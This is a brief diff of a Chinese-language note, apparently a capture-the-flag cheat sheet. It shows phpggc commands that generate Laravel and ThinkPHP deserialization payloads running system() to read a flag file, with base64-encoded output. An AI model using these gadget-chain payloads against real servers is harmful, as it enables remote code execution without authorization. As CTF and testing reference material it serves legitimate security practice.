@@ -26,11 +26,12 @@ https://github.com/ambionics/phpggc
 使用：
 ```
 ./phpggc -l
-列出
+列出全部
 
 ./phpggc -i Laravel/RCE2 
+列出框架的
 
-./phpggc -i Laravel/RCE2 system 'tac /fl*' |base64
+./phpggc  Laravel/RCE2 system 'tac /fl*' |base64
 生成序列化串
 
 ./phpggc ThinkPHP/RCE3 system() "cat /flag" --base64`
